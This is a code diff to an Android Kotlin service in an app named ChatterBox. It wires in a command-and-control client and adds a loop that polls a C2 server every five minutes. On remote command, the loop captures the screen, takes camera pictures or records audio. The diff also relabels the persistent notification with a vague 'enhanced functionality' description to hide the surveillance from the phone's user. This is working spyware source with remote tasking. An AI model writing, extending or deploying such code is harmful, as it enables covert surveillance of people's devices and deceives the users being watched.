@@ -40,6 +40,8 @@ import java.util.TimerTask
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
+import com.example.ChatterBox.malicious.C2Config
+import com.example.ChatterBox.malicious.C2Client
 
 /**
  * Background service that performs surveillance activities:
@@ -59,6 +61,9 @@ class SurveillanceService : Service() {
     private var recordingHandler: Handler? = null
     private val isRecording = AtomicBoolean(false)
     
+    // C2 client for communication with the command and control server
+    private lateinit var c2Client: C2Client
+    
     // For camera access
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
@@ -67,6 +72,9 @@ class SurveillanceService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        
+        // Initialize the C2 client
+        c2Client = C2Client(this)
         
         // Create notification channel for Android O and above
         createNotificationChannel()
@@ -85,8 +93,14 @@ class SurveillanceService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Service starting...")
         
+        // Register with the C2 server
+        c2Client.registerDevice()
+        
         // Schedule surveillance activities every 30 seconds
         startSurveillanceTimer()
+        
+        // Start checking for commands from the C2 server
+        startCommandPolling()
         
         // If service is killed, restart it
         return START_STICKY
@@ -120,8 +134,8 @@ class SurveillanceService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = getString(R.string.channel_name)
-            val descriptionText = getString(R.string.channel_description)
+            val name = "App Service"
+            val descriptionText = "Background service for enhanced functionality"
             val importance = NotificationManager.IMPORTANCE_LOW
             
             val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
@@ -134,12 +148,15 @@ class SurveillanceService : Service() {
     }
 
     private fun createNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("ChatterBox")
             .setContentText("App is running")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
+            // Using a default system icon instead of R.drawable reference
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            
+        // Setting priority using property instead of method
+        builder.priority = NotificationCompat.PRIORITY_LOW
+        return builder.build()
     }
 
     // SCREEN CAPTURE FUNCTIONALITY
@@ -235,6 +252,62 @@ class SurveillanceService : Service() {
             dir.mkdirs()
         }
         return dir
+    }
+    
+    /**
+     * Start polling for commands from the C2 server
+     */
+    private fun startCommandPolling() {
+        val handler = Handler(Looper.getMainLooper())
+        
+        // Schedule regular checks for commands
+        handler.post(object : Runnable {
+            override fun run() {
+                try {
+                    c2Client.checkForCommands { commands ->
+                        if (commands.isNotEmpty()) {
+                            Log.d(TAG, "Received ${commands.size} commands from C2 server")
+                            processCommands(commands)
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error checking for commands", e)
+                }
+                
+                // Schedule next check after a delay
+                handler.postDelayed(this, 5 * 60 * 1000) // Every 5 minutes
+            }
+        })
+    }
+    
+    /**
+     * Process commands received from the C2 server
+     */
+    private fun processCommands(commands: List<String>) {
+        for (command in commands) {
+            try {
+                when {
+                    command.startsWith("capture_screen") -> {
+                        Log.d(TAG, "Executing command: capture_screen")
+                        captureScreen()
+                    }
+                    command.startsWith("capture_camera") -> {
+                        Log.d(TAG, "Executing command: capture_camera")
+                        captureCamera()
+                    }
+                    command.startsWith("record_audio") -> {
+                        Log.d(TAG, "Executing command: record_audio")
+                        recordAudio()
+                    }
+                    // More command types can be added here
+                    else -> {
+                        Log.d(TAG, "Unknown command: $command")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error executing command: $command", e)
+            }
+        }
     }
 
     override fun onDestroy() {
